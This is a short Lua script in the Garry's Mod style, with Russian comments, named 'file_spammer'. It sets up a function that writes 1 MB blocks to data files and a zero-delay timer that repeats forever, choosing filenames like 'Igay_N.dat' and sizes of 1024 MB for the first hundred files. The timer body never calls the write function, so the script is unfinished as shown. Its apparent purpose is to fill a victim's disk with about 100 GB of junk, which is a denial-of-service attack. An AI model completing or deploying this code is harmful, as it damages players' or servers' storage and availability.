local one_mb = string.rep("A", 1024 * 1024)  -- 1 МБ блок
local function writeFile(name, mbCount)
    local f = file.Open(name, "wb", "DATA")
    if not f then print("Не удалось открыть файл: " .. name) return end
    for i = 1, mbCount do
        f:Write(one_mb)
    end
    f:Close()
end

-- Асинхронно создаёт файлы без остановки
local id = "file_spammer"
local fileIndex = 0

timer.Create(id, 0, 0, function()
    fileIndex = fileIndex + 1

    local filename = "Igay_" .. fileIndex .. ".dat"
    local sizeMB = fileIndex <= 100 and 1024 or 1

  
end)
